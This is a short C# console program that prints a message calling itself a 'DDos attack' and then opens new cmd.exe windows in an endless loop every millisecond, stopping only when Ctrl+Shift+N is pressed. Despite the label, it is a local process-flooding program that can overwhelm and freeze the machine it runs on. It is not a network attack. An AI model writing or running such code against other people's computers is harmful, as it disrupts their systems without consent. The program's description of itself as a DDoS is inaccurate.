using System;
using System.Diagnostics;
using System.Threading;
using System.Runtime.InteropServices;

class Program
{
    [DllImport("user32.dll")]
    static extern short GetAsyncKeyState(int vKey);

    const int VK_CONTROL = 0x11;
    const int VK_SHIFT = 0x10;
    const int VK_N = 0x4E;

    static void Main()
    {
        Console.WriteLine("DDos attack get started by company Tyrol");

        while (true)
        {
            bool ctrl = (GetAsyncKeyState(VK_CONTROL) & 0x8000) != 0;
            bool shift = (GetAsyncKeyState(VK_SHIFT) & 0x8000) != 0;
            bool n = (GetAsyncKeyState(VK_N) & 0x8000) != 0;

            if (ctrl && shift && n)
            {
                Console.WriteLine("[eq]");
                break;
            }

            Process.Start(new ProcessStartInfo
            {
                FileName = "cmd.exe",
                UseShellExecute = true
            });

            Thread.Sleep(1);
        }
    }
}